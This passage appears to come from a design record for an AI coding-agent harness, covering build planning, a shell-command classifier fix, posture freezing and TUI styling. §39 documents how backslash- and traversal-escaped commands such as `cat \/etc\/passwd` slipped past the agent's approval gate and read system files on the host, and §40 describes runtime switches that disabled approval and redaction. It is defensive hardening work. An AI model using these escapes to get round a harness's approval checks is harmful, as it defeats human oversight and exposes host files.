- **A `CONTEXT.md` fallback.** WS8's reason: a second path that must keep agreeing with the first.
- **`CLAUDE.md` / `QWEN.md` pointer stubs from `/init`.** One file, one copy. A user who wants
  them can write two lines; a harness that writes three files with one meaning is the shape this
  project keeps removing.
- **Google `include_thoughts`.** Still O2's decision, unchanged.
- **A proportional keep-recent floor or warning margin.** WS5 states why both stay absolute; if a
  real long thread shows the fold losing too much at once, that is the number to revisit and this
  is the sentence that says so.

## Open Questions — None Remaining

**(Rev. 3, final)** This document opened by describing itself as "a complete, no-design-decisions-left specification." As of this revision that is actually true: every open question has been answered, and what's left below needs checking against code rather than deciding.

The three that were still open at the start of Rev. 3 are now locked as **D25** (memory scope defaults to `"project"`), **D26** (`remember()` requires approval, `pin()` doesn't), and **D27** (compaction hyperparameters ship as overridable defaults rather than fixed constants). Their reasoning lives in the decisions record and in §21; it isn't repeated here.

Earlier in Rev. 3, three more were closed by verification rather than by choice, recorded so nobody re-derives them:

- **Per-model context window size** — a static `MODEL_CONTEXT_WINDOWS` table with a warned fallback for `context_limit`, plus the provider-reported `usage["input_tokens"]` for `context_used` (§21). A per-provider query was rejected: thirteen providers, no uniform endpoint, and thirteen adapters would still need the fallback constant at the end of it.
  - **AMENDED 2026-08-24 (batch 30). The rejection's PREMISE was wrong, and this is the correction rather than a re-derivation.** Measured against the pinned SDKs: `anthropic.types.ModelInfo` carries `max_input_tokens` **on the object `core/client.py` already retrieves** to read `capabilities.effort`, so the default provider's window was in hand and being dropped; `google.genai.types.Model` carries `input_token_limit`; and `openai.types.Model` is declared `extra="allow"`, so a provider's own field survives onto `.model_extra` and the whole v1-compatible roster is ONE alias reader. Two attribute reads and a sniff, not fifteen adapters. **The CONCLUSION stands and the table stays**: OpenAI, DeepSeek and Perplexity report nothing at all, so the fallback constant is still needed at the end of it — which is why this is an amendment and not a reversal. Built as `client.context_window_for`, consumed by `compaction.context_limit`, with the premise itself pinned in `tests/test_sdk_conformance.py` so a future SDK bump cannot quietly make the fallback permanent again.
- **MCP SDK call shapes** — v1.x confirmed, and the check surfaced a live major-version boundary now handled by D22's pin, plus two bugs in the sketch that had nothing to do with the original question (§17).
- **§13's unconfirmed "8 tests"** — the estimate was right; the full inventory is inline in §13's acceptance criteria so it never needs re-deriving.

**What this means for sequencing.** Nothing in this document is now blocked on a decision. §21 (memory), which was the section carrying the most open weight, is fully specified. The remaining risk is entirely in implementation and verification, which is where it should be.

### Verification items (not decisions)

Distinct from the above — these need checking against real code at a specific point, but nobody has to choose anything:

- ~~**`AgentManager`'s method surface vs. what §20 calls on it**~~ (was Open Question 3). **CLOSED at §20's build**, both sides now existing: the call sites are `get()`, `active_context()` and `system_prompt_for()`, all present on `AgentManager`, none needing a signature change. The flagged mismatch was not real.
- **Re-verify the pinned `mcp` version's client API** against §17's call shapes at implementation time (D22). The version boundary was live when this was written, so this document's snapshot has a short shelf life by construction.

### Lower-priority items tracked but not re-litigated in this revision

These came from the tool-assisted review pass, assessed as real but either already addressed by a decision above or genuinely lower-stakes — listed here so they aren't silently lost, not because they need a decision right now:

- Parameter naming consistency (`system_prompt_override` vs `system_prompt`) across §18's agent-invocation code paths — a naming cleanup, not a design question.
- MCP server connections during `connect_all()` could run in parallel rather than sequentially — a performance refinement once §17 exists to optimize. **(Rev. 3)** Note this interacts with the `AsyncExitStack` design: parallel connection is `asyncio.gather` over the per-server enters, all still on the single MCP loop, so it stays compatible.
- Test infrastructure for the streaming (§13), async bridge (§17), and TUI (§16) pieces needs its own planning pass once those are being built — flagged as real work, not deferred as unimportant. **(Rev. 3)** Two constraints on that pass are now known: §13's tests must assert against persisted `MessageLog` state and against `total_tokens_used`, not only against returned `ModelResponse` objects (D20, D21 — both failure modes are invisible to return-value assertions); and if §17 ends up on the SDK's v2 line, its in-memory transport removes the need to spawn real subprocesses for bridge tests entirely.
- `run_to_completion()`'s exact placement was open in Rev. 1 (S16) — resolved above (`core/loop.py`).
- **(Rev. 3, SETTLED at the §19 build as K7 — no refresh)** `registry.schemas(allowed_tools)` is computed once at the top of `_run()` and never refreshed. Activation happens *between turns* via a slash command, and `_run()` is called once per turn, so it recomputes schemas before every turn that could be affected — a turn can never hold a tool list that went stale during it. Two things would reopen this: a tool that activates a skill (making activation mid-turn), or MCP servers connecting after startup. Neither exists; if either is built, revisit here rather than rediscovering it as a bug.

  Note the §19 answer does not depend on this: `additional_tools` is a precondition, not a grant (K2), so activating a skill does not change the tool set at all. The refresh question is only about runtime `register()`/`unregister()`.

---

## Why these calls, not just what they are

A few threads of reasoning run through several decisions above and are worth carrying forward as habits, not just conclusions. The first three are inherited from the project's existing practice; the last two are what Rev. 3's verification pass added.

**"Distill, don't share raw history."** Established by the research pipeline (each pass gets its own thread; only a distilled result carries forward), and it independently validates two later designs: a subagent returns only `response.text` to its parent (§18), and §20 passes the pipeline's already-distilled `trace` rather than raw per-pass conversations. Apply the same lens to anything new that spans conversation threads — §21's compaction is the newest instance.

**"When a fix is a special case bolted onto a consumer, the real fix belongs one layer down, at the producer."** From `core/memory.py`'s history: a resume-shape bug was fixed for `role == "assistant"` via a read-side special case, while the identical root cause in `add_tool_result` went uncaught. Fixing what gets *written* closed it for every role at once. The same shape recurs twice in this document: MCP being async is a reason for one bridge at the one async boundary (D2a), not for making every tool handler async; and MCP returning `CallToolResult` is a reason for one normalization at the bridge (D23), not for teaching `check_output_policy`, `add_tool_result`, and every future consumer about MCP types.

**Convergent findings are high-confidence; single-method findings are "credible, verify."** Rev. 2 noted that manual tracing and a tool-assisted review pass independently landed on the same three issues. Rev. 3 is the corollary: of the items only one method had flagged, some were confirmed exactly (the "8 tests" estimate), and some were confirmed *and* turned out to be larger than described (the MCP call shapes, which were flagged as "check the signatures" and actually concealed a version boundary, a session-lifetime bug, and a result-type mismatch). Treat "worth a targeted verification" as a real work item with unbounded upside, not a formality.

**(Rev. 3) An abbreviated restatement of existing code is a proposal to delete whatever it abbreviates.** This document's code blocks serve two different purposes that look identical on the page: some specify new code, and some restate existing functions in order to change one part of them. The second kind is dangerous, because everything omitted for brevity reads as everything the function does. Rev. 2 hit this three times — `dispatch()` lost `check_output_policy()` and the unknown-tool guard, `_run()` lost its persist-before-branch ordering, and the wrapper list lost `continue_conversation()`. Two of the three would have silently removed a documented bug fix, and one would have removed a security layer. **The rule: before implementing from a sketch that modifies an existing function, diff it against the real implementation.** Where a section here does that, it now says so explicitly.

**(Rev. 3) A defensive default is only safe where absence is impossible.** `getattr(permissions, tool_name, False)` and `getattr(usage_obj, "input_tokens", 0)` are both reasonable-looking defensive reads, and both produce silent, invisible failures the moment the thing they're defending against actually happens — `fetch_url` permanently denied because a field was never added (D24), token budgets pinned at zero because a streaming API reports usage differently (D21). Neither errors; both just quietly do the wrong thing forever. This is the exact inverse of the project's established loud-failure pattern (`credentials.py` raising rather than defaulting, `get_thread` raising on an unknown id). Where a default *is* meaningful — `_default_for_unknown_tool()` for dynamically-named MCP tools — give it a name and a docstring so it reads as a decision rather than as an accident.

---

## Dependency Graph

```
§13 (streaming) ──┐
§14 (file syntax + trust) ─┼──→ §16 (TUI) ──→ §17 (MCP)
§15 (permissions) ─┤                  │
                   │                  ↓
                   ├──→ §18 (agents) ──→ §20 (subagent review)
                   │
                   └──→ §19 (skills)

§21 (memory) — needs §14 (agents/builtin/ for compactor.md) and §13 (compaction retry reuses the JSON-retry-style pattern) but is otherwise independent of §16-§20
```

**Recommended build order:** §13 + §14 + §15 (foundation, parallel) → §16 (TUI) → §17 (MCP) → §18 (agents) → §19 (skills) → §20 (subagent review) → §21 (memory, though it only strictly needs §13+§14 and could move earlier if prioritized).

---

## New Dependencies Summary

| Package | Phase | Purpose | Notes |
|---|---|---|---|
| `pyyaml` | §14 | YAML frontmatter parsing | Pin explicitly |
| `textual` | §16 | TUI framework | Major new dependency |
| `mcp` (official SDK) | §17 | MCP client protocol | **Pin with an upper bound (D22)** — `mcp>=1.27,<2` if targeting the v1.x client API §17 is written against. The SDK is mid-major-version transition and its own README instructs dependents to add the `<2` bound. Async-only in both lines — see D2a for why that doesn't make the rest of the harness async |

---

## New Files Summary

| File | Section | Purpose |
|---|---|---|
| `core/events.py` | §13 | `LoopEvent` types |
| `core/workspace_trust.py` | §14 | Project directory trust gate |
| `core/config_loader.py` | §14 | `.md`/`.json` discovery + frontmatter parser + D27's settings resolution order (config → user → project → per-invocation), with range validation |
| `tools/context.py` | §15 | `ToolContext` dataclass |
| `tui/app.py`, `tui/widgets.py`, `tui/commands.py` | §16 | Textual app, widgets, slash commands |
| `mcp/client.py`, `mcp/config.py` | §17 | MCP client (with async bridge) + `mcp.json` loader |
| `agents/manager.py`, `agents/subagent_tool.py` | §18 | Agent lifecycle + `spawn_subagent` tool |
| `agents/builtin/*.md` | §18, §21 | Built-in agents, including `compactor.md` |
| `skills/manager.py`, `skills/builtin/*.md` | §19 | Skill lifecycle + 4 default skills |
| `core/memory_manager.py` | §21 | Compaction trigger/checkpoint logic |

---

## Modified Files Summary

| File | Section | Change |
|---|---|---|
| `core/client.py` | §13 | Add `call_model_stream()` — **three provider implementations** (Anthropic typed events, Google chunked candidates, OpenAI-compatible index-accumulated tool-call fragments), plus `collect_response()` and D21's usage-or-raise handling |
| `core/loop.py` | §13, §15, §18 | `_run()` → generator (preserving D20's persist-before-branch ordering); `run_to_completion()`; accept `permission_channel`, `tool_context`. **Three** wrappers convert, not two — `run_agent_conversation`, `run_deep_research_mode`, **`continue_conversation`** |
| `core/memory.py` | §21 | Ordinal→row-id resolution for `pin`; checkpoint-aware history load (leading summary + uncompacted tail) |
| `core/reasoning/orchestrator.py` | §20 | Subagent review after pipeline |
| `core/reasoning/base.py` | §20 | `subagent_reviews` field on `PipelineRun` |
| `security/permissions.py` | §15 | "Stricter wins" — context-aware `is_tool_allowed()`/`requires_approval()`, dynamic-tool default handling |
| `tools/registry.py` | §15 | Runtime `register()`/`unregister()`, `dispatch(context=)`, approval OR-composition. **Preserve the unknown-tool guard and the `check_output_policy()` call** (Rev. 3 correction); add D24's import-time permission-declaration check |
| `storage.py` | §21 | New `pinned` column on `MessageLog`; new `CompactionCheckpoint`, `UserMemory` tables; **`get_session_history(after_message_id=...)`** for loading the uncompacted tail |
| `config.py` | §14, §20, §21 | New constants for subagent review, compaction defaults (D27 — overridable, not fixed), `MODEL_CONTEXT_WINDOWS`/`DEFAULT_CONTEXT_WINDOW`. New `ToolPermissions`/`ToolApprovals` fields for `pin` and `remember` (D26) and for **`fetch_url`, currently missing and denied as a result** (D24 — confirm intended defaults) |
| `providers.json` | §13 | Per-provider `supports_stream_usage` flag — same shape as the existing `is_v1_compatible`, needed because some v1-compatible providers reject `stream_options` outright (D21) |
| `main.py` | §16 | `--tui` / `--no-tui` flags; wire MCP `disconnect_all()` into the existing shutdown path |
| `requirements.txt` | §14, §16, §17 | `pyyaml`, `textual`, `mcp` (**pinned with an upper bound, D22**) |
| `tests/BREAKING_CHANGES.md` | §13 | Update §68's `_run()` entry — the generator conversion is a breaking change to all 8 direct-calling tests |

## §39. The last tokeniser disagreement, and the first word of a compound command

**Status: BUILT.** The question that started it was whether the shell allowlist matches only the
first keyword, so that `[inert command] && [dangerous command]` would be auto-approved on the
strength of the inert half. **It does not, and `&&` is not the hole.** `_is_inert` does match
`INERT_COMMANDS` on the first word, but the first-word match is not the gate:
`_SHELL_METACHARACTERS` rejects the whole command outright when it contains any of
`; | & $ ` > < ( ) { } ! # ~ ' "`, so a chained command leaves the inert host path before the
allowlist is ever consulted. Measured: `ls && cat /etc/passwd`, `ls; cat /etc/passwd` and
`ls | cat` all classify SANDBOXED. Every chaining construct in bash and PowerShell — `&&`,
`||`, `;`, `|`, `$(…)`, backticks, `<(…)`, redirection — is covered by that one class.

**Splitting the command on `&&` and classifying each segment would have made this worse.** It
would mean *accepting* a command containing `&&` into the inert path, which is what
`_escapes_workspace`'s docstring forbids in as many words: "a classifier that starts
interpreting shell syntax is a shell parser whose bugs auto-approve things". Today `&&` is a
hard reject; splitting on it turns a reject into a parse, and the parse would have to be as
good as bash's forever.

**But the shape of the question was right, and looking found a live one.** Batch 37 closed the
quoting bypass by adding `'` and `"` to that class, because the classifier reads raw `.split()`
tokens while `_run_inert` execs `shlex.split()` tokens. It did not add `\`, which shlex also
consumes. Measured on a real POSIX host at the shipped `"tiered"` default, before the fix:

```
'cat \/etc\/passwd'   INERT   asks=False
    -> RAN ON HOST rc=0 stdout='root:x:0:0:root:/root:/bin/bash | daemon:x:1:1:...'
```

Audit **#157** for the third time, through the one remaining gap between the two tokenisers.
Same vector as batch 37's quoting bypass —
`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`, **6.0** — needing only
`ToolPermissions.shell = True`. Read-only, and `check_output_policy` covers vendor tokens and
password fields, not SSH keys or arbitrary file content.

### Design Decisions Record — §39 (Q1–Q6)

| id | decision |
|---|---|
| **Q1** | **`\` joins `_SHELL_METACHARACTERS`, on every platform.** The alternative was to reject it only where the executor consumes it — `_run_inert` uses `shlex.split(posix=False)` on Windows, so the classifier and executor there already agree, and a shared `_POSIX_TOKENS` constant would have made the coupling explicit at zero Windows cost. Rejected (owner decision) because batch 37 locked the invariant test at `posix=True` on **every** platform, reasoning that it is "the stricter of the two, so the property holds everywhere rather than only where the test happens to run" — and `cat .\.\/etc/passwd` classifies INERT on Windows too, so making that test generative turns it red there. POSIX-only would have bought back one Windows convenience by weakening a decision locked the day before |
| **Q2** | **`_needs_network` counts every command position of a compound command** (owner decision), reversing its own docstring's rule — "only the invoked binary is checked … to prevent a command from granting itself network access via a keyword in its arguments". **This is not an escalation and the reversal is not a fix for one.** `network` is one fact with two consumers, so the flag withheld from `echo hi && curl x` is the flag `_run_docker` reads, and the whole compound line ran under `--network none`: the egress was never there to take. What was wrong is the CLASSIFICATION — the profile asserted "no network" about a call that plainly wanted it, and `auto_approved` skipped the human on that basis. The reversal's price is real and is paid knowingly: `python script.py # pip` now requests network on the strength of a word in a comment |
| **Q3** | **`_within` fails CLOSED on a path it cannot resolve.** `os.path.realpath` raises on **both** platforms, on different inputs and with different exception types: Windows raises `OSError: [WinError 668]` on a malformed UNC path (`\\;`), and POSIX raises `ValueError` on an embedded NUL (`a\0b`), which a JSON tool-call argument can carry as `\u0000`. Neither token triggers it on the other platform — a backslash is a path separator on exactly one of the two — which is why `except (OSError, ValueError)` needs both clauses and why the test pins the CONTRACT by making `realpath` raise rather than by naming a token. `_within` runs inside `classify_command`, which runs inside `registry.approval_needed()`, which is handed the model's tool-call input verbatim — with no handler anywhere above it. So `ls \\;` was an unhandled OSError out of the approval gate. That is `classify_command`'s own totality requirement failing one layer down, on a value that IS a string and so walks past the isinstance guard written for it. False is the only defensible answer: a path the harness cannot resolve is not one it can vouch for, and this predicate's False means "ask", never "deny silently" |
| **Q4** | **The escape does not need to produce an ABSOLUTE path.** `.\.\/etc/passwd` reads as a relative path inside the workspace and becomes `../etc/passwd` once shlex is done — escape by traversal, not by absolute path. This is why the leading-backslash spellings are not the family, and why a guard that unescaped and then re-checked for `/` would have missed it. It is also the spelling that makes Windows non-exempt as a classification even though it is non-exploitable there as an execution |
| **Q5** | **The fix is a CLOSURE, not the next patch in a series, and the record says which.** shlex in POSIX mode consumes exactly four things: whitespace, `'`, `"` and `\`. Whitespace splits both tokenisers identically; the other three are now all rejected. So for any command reaching the inert path, `command.split()` and `shlex.split(command)` are provably the same list — there is no fifth character to find next batch. Pinned as a property over a generated corpus, not as an assertion about the three spellings that happened to be found |
| **Q6** | **The reversal stops at `_is_inert`.** An inert command carries no metacharacters, so it cannot chain — its first word is its only command position, and scanning its arguments would make `grep pip notes.txt` and `grep git notes.txt` prompt while buying nothing. The quantifier is chosen by a predicate `classify_command` already computes, read twice rather than called twice. The other half of Q2 is the one users feel: `cd proj && pip install -e .` and `python -m pip install x` have no egress today AND are never asked about, so there is no way for a user to allow them — the command just fails inside a network-less container for a reason nothing reports |

### Found by the corpus, not by the review

Q3 is not a finding anyone reached by reading the code, including the reading that produced
the others in this same file. It fell out of the generative corpus on its first run, because `\\;`
is not a spelling anyone writes down — and it had been reachable from model output since the
classifier was written.

That is the argument for the corpus being generated rather than enumerated, and it is the same
argument batch 37 made and then did not finish making. Batch 37 wrote
`test_the_classifier_and_the_executor_agree_on_every_token` with exactly the right docstring —
"over a corpus rather than over the three spellings that happened to be found" — and gave it
eight hand-written spellings, none containing a backslash. The invariant was named correctly
and under-populated, so it passed for a day over the one character that broke it. An
enumerated corpus can only contain the cases its author already thought of, which is the set
that has already been fixed.

### Deliberately not in §39

**Splitting a command on its separators and classifying each segment.** See above; it inverts
the module's soundness argument.

**Teaching the classifier to unquote or unescape.** Batch 37 rejected this for the quoting
bypass and the reasoning transfers unchanged: it closes the hole by becoming the shell parser
`_escapes_workspace` explains it must never become.

**Changing `_escapes_workspace` to read shlex tokens.** It is also called for the SANDBOXED
tier, where quotes and backslashes are legal and it still reads raw tokens — but there
`auto_approved` never consults `escapes_workspace` (CONTAINED ignores it because the container
bounds the filesystem; UNCONTAINED is already forced to ask by `writes=True`). So it is a
reporting inaccuracy in `profile.reason`, not a gate. Named here rather than fixed, because a
half-understood control is worse than none.

**The Windows regression is priced, not mitigated.** `cat sub\dir\notes.txt` runs on the inert
path today on Windows (measured: `rc=0`, 302345 bytes) and now goes to Docker, where `bash -c`
strips the backslashes and it fails. Forward slashes work on Windows for every
`INERT_COMMANDS` binary — most of which are Git-for-Windows MSYS2 builds — and the failure is
loud rather than silent. Pinned as a test so the cost cannot be rediscovered as a bug.

### Closed with this section

The `&&` question, answered as verified-false with the measurement rather than with reasoning.
**#157's third and last arrival** — the character class is now closed under shlex's own
transformations, which is a stronger statement than the previous two fixes could make.

---

## §40. The security posture — bound once, and said out loud

**Status: BUILT.** Asked whether the harness has a single switch that turns every protection off,
for security researchers who want an unbounded run and accept the consequences. It does not, and
answering it properly turned up something that was already true on `main`.

**Every security flag was read LIVE, at the moment each decision was made.**
`tools/builtin/shell.py` said so in as many words:

> Re-checked per call as well, because a test or a runtime edit can change it after this line has
> run.

That sentence describes a test seam and an attack in the same breath. `config.SHELL_APPROVAL_MODE =
"never"` was one attribute assignment, from anywhere in the process, and the gate followed it for
every command afterwards. So did `ALLOW_INSECURE_SANDBOX_FALLBACK`, `AUTO_APPROVE_SANDBOX_FALLBACK`
and `REDACT_TOOL_OUTPUTS`. The project's own history says this is not hypothetical: `_math_common.py`
exists because "an expression string is code", and its docstring lists the escapes found before the
AST allowlist went in.

**And one flag had an environment input, read at call time.** `redaction_enabled()` consulted
`os.environ["VENASTINE_REDACT_OFF"]` on every call, so `os.environ[...] = "1"` was a live in-process
switch for credential redaction. Batch 37 pinned the mirror of this from the other side — mutating
the environment cannot move `AGENT_WORKSPACE`, because `config` binds at import — and this is the
case where the same asymmetry ran the other way.

The unsafe switch itself is **not** in this section. It ships on the `unsafe-mode` branch (§90), and
this batch is the part every user should have: the posture is bound once, frozen, and reported.

### Design Decisions Record — §40 (UN1–UN6)

| id | decision |
|---|---|
| **UN1** | **The posture is bound once at import and frozen.** `security/posture.py` holds a `@dataclass(frozen=True)` read from `config` and the environment exactly once; `config.py` is still where a human writes the value and stops being what is read at decision time. This follows `AGENT_WORKSPACE`'s precedent rather than `SHELL_APPROVAL_MODE`'s — batch 37 recorded that the fix someone reaches for ("resolve it at call time so tests can redirect it") is precisely the one that must not be made for a value that is a permission boundary. The blast radius was 23 `monkeypatch.setattr(config, …)` call sites, all of which worked *only* because of the property being removed |
| **UN2** | **Ordering is self-enforcing, and it fires on a CHANGE rather than on a read.** `current()` marks the posture bound; `apply_cli()` raises if folding in the command line would now produce something different. Raising on the read alone was the first draft and it was wrong twice over: `tools/builtin/shell.py` validates the approval mode at *import*, so every launch died in the guard, and `main()` became un-callable twice in one interpreter, which the suite does constantly. A guard the tests have to work around stops being read as a guard. The rule it depends on — **no module may read the posture at import time** — is pinned by a source scan, and shell.py's import-time check reads `config` directly for exactly that reason |
| **UN3** | **`unsafe_reasons()` is the single description.** The startup banner, the launch WARNING and the TUI badge all read one method, so three surfaces cannot describe one state in three slightly different ways — which is how a user ends up trusting whichever is wrong. Same argument §37 F4 made for the per-server auto-approve warning, and §28's "one classification, two consumers" one level up. `AUTO_APPROVE_SANDBOX_FALLBACK` alone reports nothing, deliberately: without the fallback enabled it cannot do anything, and a warning a user cannot act on is noise. It returns `(label, detail)` PAIRS rather than sentences, because the surfaces differ in width: the sidebar is twenty columns and shows the label, stderr and app.log show the detail. A second method deriving short names would put the conditions in two places, which is the drift this method exists to prevent -- and the raw constant name is 31 characters, so it wrapped mid-identifier |
| **UN4** | **The guarantee is stated with its limit.** The posture cannot be changed by a tool call, a settings file, an environment variable, model output, or a TUI command — each pinned by its own test. It **can** be changed by arbitrary in-process Python, which can also rebind `current` itself. A frozen dataclass raises `FrozenInstanceError` where a bare `config.X = …` succeeded, which raises the bar without closing the class. Saying more than that would be the "reads as safety without being it" failure SECURITY.md already names for the insecure fallback |
| **UN5** | **The publish guard lives on `main`, not on the branch that needs it.** `scripts/prepublish-check.mjs` refuses to publish a tree carrying an `UNSAFE_BRANCH` marker or a `config.py` declaring `UNSAFE_NO_*`. On `main` it travels into the branch by merge, so the branch cannot lose it by forgetting or by a bad conflict resolution — and it catches the reverse accident, unsafe code merged INTO main and published from there, which is the unrecoverable direction: a published npm version can never be replaced, only deprecated. Two independent detectors because either alone is one rename from silence |
| **UN6** | **`VENASTINE_REDACT_OFF` is bound too, and stays a separate field.** Folding it into an effective boolean would erase `redaction_enabled()`'s real distinction: the constant is the permanent answer, the environment weakens it for one run, and the environment may only ever turn redaction OFF. Two fields keep that expressible; only the moment of reading moved |

### The banner is for `main`, not for the branch

The badge and the startup warning are not scaffolding for a feature this branch lacks.
`ALLOW_INSECURE_SANDBOX_FALLBACK` is a real posture a user can be in today with **no indicator
anywhere**, and the case that matters is not the researcher who just typed a flag — it is the user
who set it months ago and forgot, or who inherited a `config.py` from somewhere. Neither of them
reads `app.log`. So the mechanism is driven by a live flag on `main` and exercised by `main`'s own
suite; the branch only extends the list it reports.

### One test that survived its own mutation

`test_the_publish_guard_is_wired_into_the_prepublish_check` asserted that
`problems.push(...unsafeBranchProblems());` appears in the source. The mutation that disables the
guard comments the line out — and the substring is still there, so the test passed. It now scans
live lines only. The vacuity class, caught by running the mutation rather than by reading the
assertion.

### Deliberately not in §40

**No CLI flag.** Nothing on `main` needs one; `apply_cli()` exists and takes no overrides here, which
is what makes the ordering guard verifiable before the branch depends on it.

**No `settings.json` key, and no environment variable, for any posture field.** G7's argument
generalises: a project's settings beat the user's and arrive with a directory you cloned.

**The other live-config reads are out of scope.** `config.ToolPermissions()` and `ToolApprovals()`
are still constructed per call. They are the D14 ratchet and can only tighten, so the same mutation
against them causes prompts rather than skipping them — a different risk, and one that wants its own
batch rather than a rider on this one.


## §41. The transcript's vocabulary — colour, markers, and what an edit looks like

**Status: BUILT.** Three complaints from using the TUI, one of which turned out to have a real
defect underneath it.

**Three kinds of line were one colour, and one of them was never coloured at all.**
`role_styles` gave `system` = `dim italic`, `thinking` = `italic {secondary}` and `tool` =
`dim {accent}`. Across the grid themes accent and secondary are one luminance step apart in the
same hue, so dimming accent lands it on secondary: a tool call and a reasoning line rendered
identically, and the dim grey `system` sat close enough to both to complete the blur. Underneath
that, `TranscriptLogHandler` — the component that exists *because* the TUI takes stderr away —
flagged only `levelno >= ERROR`, so every WARNING it routed was written with `write_system`.
`themes.role_styles` has carried a `warning` colour since §26 and no transcript line had ever
used it; the one widget that did (`GoalBanner`) composed its own weight on top.

### Design Decisions Record — §41 (X1–X7)

| id | decision |
|---|---|
| **X1** | **`tool` renders in plain `accent`, and dark-plain's accent was lifted to meet it.** Two halves, because the collision had two causes. `dim` is a Rich *attribute*, not a colour, so this file's contrast floors measure the undimmed hue and cannot see what the terminal paints — which made the style on every tool call the one style whose real contrast nothing measured. And underneath that, dark-plain's accent `#a9b2c3` sat **98.5 redmean units** from its secondary `#8792a2`: the tightest secondary/accent pair of all fourteen themes (the next is paper at 143.8), on the shipped default. A monochrome theme cannot separate two roles by hue, so only lightness is left, and dark-plain's did not have enough of it. `#b8c1d1` measures 142.7 while staying 111 units off the foreground — go lighter and the assistant label melts into the body text it introduces, which is the same defect facing the other way. Batch 29's #14 nudge, on a different axis: that one measured contrast against the BACKGROUND, this one measures separation between two roles that sit on adjacent lines |
| **X2** | **A routed log record carries a PALETTE ROLE, not an `is_error` bool.** `LogRecordMessage(text, role)` and one `write_role()` call replace the two-branch `write_error`/`write_system` split. The bool was not merely underspecified — it had no warning case at all, so the handler delivered warnings in the role that means "the harness narrating itself". `warning` becomes `bold {theme.warning}` where `tool_error` stays plain: both are non-fatal and keep the hue family, and the weight separates the harness raising its voice from a tool that failed. `GoalBanner` stops composing its own `bold` — with the weight in the role, composing it a second time yields `bold bold #d9a441`, and a style decided in two places is the drift §26's palette exists to prevent |

| **X3** | **One checklist vocabulary, in `tui/widgets.py`, and two of the five marks are deliberately not boxes.** `TodoPanel` and `ResearchProgress` each had their own spelling, and they disagreed: `·` meant *pending* in the todo panel and *a code stage that has already finished* in the research panel — one mark with opposite meanings, two panels a screen apart. The three states a checklist item can be in are now one Unicode family (U+2610 ☐ / U+2611 ☑ / U+2612 ☒), so a reader learns one shape and reads its contents rather than memorising which punctuation the author picked. **Running is not a fourth box** (`▸`, the transcript's own tool marker): an empty box says *nothing has happened here*, which is exactly what a pass burning tokens is not, and telling the live pass from the queued ones is the whole job of the research panel. **A zero-LLM stage is not a box either** (`·`) — §26 marked it apart from a pass because it made no model call, so it has no pending form and no running form to check off. E14's constraint survives unchanged: a row that ended badly does not share a glyph with one that finished |

| **X4** | **The diff is built AT THE RESULT, from a pre-image snapshotted at the call, and the post-image is reconstructed rather than read back.** Three decisions, one shape. At the result, because a call can still be denied at the permission gate or refused by the tool (`old_text` not unique, the path unwritable) — a diff drawn at `tool_call_start` would show a change that never happened. From a snapshot taken at the call, because that is the last moment the file still holds what is about to be replaced. And reconstructed — `params["content"]` for `write`, `pre.replace(old, new, 1)` for `edit`, which is exactly what `edit_run` did on a span the tool has already guaranteed unique — because reading the file back would spend a second read and could pick up a change some other process made in between. The tool line above the block keeps the NAME and drops the digest: keeping it would print 60 characters of `old_text` and 60 of `new_text` directly above a block that says it properly. `read` is not in `DIFFED_TOOLS` — it changes nothing, so there is no diff to draw. Redaction goes through **`redact_output_text`**, made public for this: the function has always described itself as "the one redaction path tool OUTPUT takes", a `write` renders the content the tool put on disk, and `redact_secrets` alone catches the vendor tokens but not the three credential SHAPES (#167) — so the narrower call would have made the block redact LESS than the digest line it replaces. It runs AFTER the reconstruction, because `redact_output_text` sees more context in the file than in the argument and can match a longer span there (`ci:pw@host/v1` is untouched alone and redacted inside `https://ci:pw@host/v1`, the userinfo pattern anchoring on `//`); redacting first leaves the redacted `old_text` no longer a substring of the redacted file, the replace finds nothing, and the block is empty for a reason unrelated to the edit. **The residual gap is announced rather than hidden**: redacting both sides with the same substitution is what stops an unchanged secret reading as a spurious edit, and it also collapses a change that was entirely INSIDE one — which is exactly what rotating a credential is — so an empty block over a file that did change prints one line saying so. M14's rule, on the edit a reader is most likely to be checking |
| **X5** | **The block is TEXT, and the furniture belongs to the renderer.** `Transcript._entries` holds `(role, text)` and everything downstream — `/copy`, `rerender()` after a `/theme` — reads it as text, so a structured payload would have meant widening that tuple for one caller. `build_block()` and `parse()` live in one module so the format has one definition. The indent, the padding and the colours are not stored, for the reason §38 gives the thinking bar: `/copy` should hand back a diff rather than a decorated string. **Every rendered row is padded and written with an explicit `width=`** — RichLog otherwise raises a short row to `min_width` and `Strip.adjust_cell_length` pads the tail with an UNSTYLED segment, so the background would stop at the last character of the source line. That is the difference between a marked line and a coloured word, and it is why the wrap has to be ours as well: measured, Rich's soft wrap returns rows of 78, 75, 78 and 66 cells, and the tint stops wherever the text happened to break |
| **X6** | **A diff that cannot be computed NARROWS; it never raises.** `_snapshot` runs on the UI thread inside the message pump, where an escaping exception takes the app down over a rendering — so an absent file, a directory, an undecodable one, one past `DIFF_SNAPSHOT_MAX_BYTES` and a `path` that is not even a string all come back as None. From there `write` renders as an all-new block and `edit` renders its own `old_text`/`new_text` without line numbers or context, because those came from the call's arguments and need no file at all — still strictly more than the 60 characters of each the digest showed. The cap is the TUI's own (512 KB), not `config.MAX_FILE_SIZE_BYTES`: 25 MB is the bound on what a tool may operate on, and this is the bound on what is worth holding to draw a transcript block |
| **X7** | **The add/remove tints are DERIVED from the theme's own `success`/`error`, blended 0.8 toward its background.** #116's rule reaching the one place in the transcript that sets a background: a literal pair of green and red would be designed against one of the fourteen palettes and wrong on the other thirteen — visibly so on the six standalone themes, whose panels carry the identity. Two floors, not one: the foreground must read on the tint (>= 4.5:1, measured 9.3-12.2) **and** the tint must stand off the page (>= 1.15:1, measured 1.22-1.53). A readability floor alone is satisfied by blending further, which fades out the band the feature exists to draw — the floor would be met by removing the feature |

### Three pins, because one instrument could not see the defect

`tests/test_themes.py` gains `MESSAGE_ROLES` — every role a transcript line can be painted with —
and three checks over it. The first draft had only the first of them, and it passed against the
reverted bug, which is how the other two got written.

- **Pairwise distinct style STRINGS**, on all fourteen themes. Strings rather than colours, because
  `italic #8792a2` and `#8792a2` are two legitimate renderings of one hue (`themes.py` says so
  for `thinking` vs `pass_done`) while two identical strings cannot be anything but the same line
  twice. This is what catches `warning` == `tool_error`. `user_label` is excluded by name: it and
  `user` are the two halves of one rendered line and are *meant* to match.
- **A REDMEAN separation floor** between the accent and secondary slots, at 120. Not WCAG
  contrast: contrast answers "can this be read against that background", and it cannot see hue —
